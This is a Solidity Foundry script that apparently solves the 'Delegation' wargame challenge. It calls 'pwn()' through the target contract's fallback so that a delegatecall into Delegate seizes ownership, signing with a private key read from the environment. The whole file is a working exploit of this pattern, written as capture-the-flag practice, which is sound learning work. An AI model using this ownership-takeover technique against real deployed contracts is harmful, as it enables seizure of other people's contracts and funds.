// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Script.sol";
import {Delegation, Delegate} from "../src/Delegation.sol";
contract FallbackScript is Script {
    Delegation public delegationContract;
    Delegate public delegateContract;

    function setUp() public {
        delegationContract = Delegation(payable(vm.envAddress("DELEGATION_CONTRACT")));    
    }
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address(delegationContract).call(abi.encodeWithSignature("pwn()"));
        vm.stopBroadcast();
    }
}
